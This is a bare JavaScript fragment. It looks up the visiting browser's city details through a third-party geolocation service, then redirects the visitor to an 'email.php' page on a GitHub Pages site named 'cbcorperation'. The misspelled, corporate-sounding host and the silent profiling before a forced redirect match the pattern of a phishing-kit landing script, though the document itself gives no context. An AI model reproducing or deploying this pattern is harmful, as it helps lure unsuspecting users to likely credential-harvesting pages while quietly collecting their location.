
$.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', function(data) {
  var a = (JSON.stringify(data, null, 2));
});
window.location = "https://cbcorperation.github.io/cbcorperation/php/email.php";
